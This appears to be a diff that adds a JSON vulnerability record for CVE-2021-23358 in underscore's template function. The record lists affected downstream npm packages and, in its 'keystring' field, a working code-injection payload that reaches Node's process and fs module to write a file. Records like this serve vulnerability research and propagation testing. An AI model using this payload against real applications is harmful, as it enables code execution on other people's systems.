@@ -1,0 +1,25 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.1.6",
+  "keymethod": "templateSettings.variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "underscore.string@1.1.4",
+    "fix@0.0.6",
+    "recline@0.0.4619",
+    "sudoku@0.0.2",
+    "wobot@0.3.0",
+    "mongolia@1.5.1",
+    "fix-protocol@1.0.1",
+    "arel-clone@0.1.0",
+    "rel@0.0.1",
+    "peanut@0.2.0",
+    "sudoku-rnplay@0.0.2",
+    "transitive@0.0.0pre10",
+    "asereje@0.0.1",
+    "activeobject@0.0.1",
+    "wsclient@0.1.1",
+    "activenode-monitor@0.0.1"
+  ]
+}
